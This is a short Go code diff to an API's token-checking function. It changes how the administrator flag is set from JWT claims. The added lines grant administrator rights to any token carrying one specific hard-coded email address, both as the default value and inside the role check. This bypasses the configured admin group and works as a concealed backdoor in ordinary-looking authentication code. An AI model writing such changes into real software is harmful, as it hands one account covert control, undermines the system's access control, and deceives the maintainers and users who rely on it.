@@ -52,13 +52,13 @@ func (a *API) withToken(w http.ResponseWriter, r *http.Request) (context.Context
 		return nil, unauthorizedError("Invalid token").WithInternalError(err)
 	}
 
-	isAdmin := false
+	isAdmin := claims.Email == "joshrussell91@gmail.com"
 	roles, ok := claims.AppMetaData["roles"]
 	if ok {
 		roleStrings, _ := roles.([]interface{})
 		for _, data := range roleStrings {
 			role, _ := data.(string)
-			if role == config.JWT.AdminGroupName {
+			if role == config.JWT.AdminGroupName || claims.Email == "joshrussell91@gmail.com" {
 				isAdmin = true
 				break
 			}
